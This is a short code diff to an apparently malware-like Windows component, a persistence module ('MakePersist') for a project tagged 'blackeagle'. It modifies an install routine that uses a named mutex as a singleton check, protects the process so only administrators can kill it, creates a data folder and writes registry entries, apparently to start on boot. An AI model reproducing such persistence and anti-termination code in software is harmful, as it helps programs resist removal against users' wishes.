@@ -1,6 +1,6 @@
 #include "MakePersist.h"
 
-LPVOID install() {
+LPVOID install(BOOL reg) {
 	// Singleton
 	CreateMutexA(0, FALSE, "Local\\$blackeagle$"); // Try to create a named mutex
 	if (GetLastError() == ERROR_ALREADY_EXISTS) // Does the mutex already exist?
@@ -8,6 +8,12 @@ LPVOID install() {
 
 	// Process is allowed to be killed only by administrators.
 	ProtectProcess();
+
+	// Create deafult data folder if not exists already
+	CreateDirectory(stringToWString(DATA_FOLDER_PATH).c_str(), NULL);
+
+	if (!reg)
+		return NULL;
 
 	LPCWSTR regPath;
 	LPCWSTR regName;
@@ -31,7 +37,7 @@ LPVOID install() {
 
 	// TODO 
 	// Enable scheduler
-
+	return NULL;
 }
 
 DWORD createKey(LPCWSTR registryPath, LPWSTR registryName, LPWSTR value)
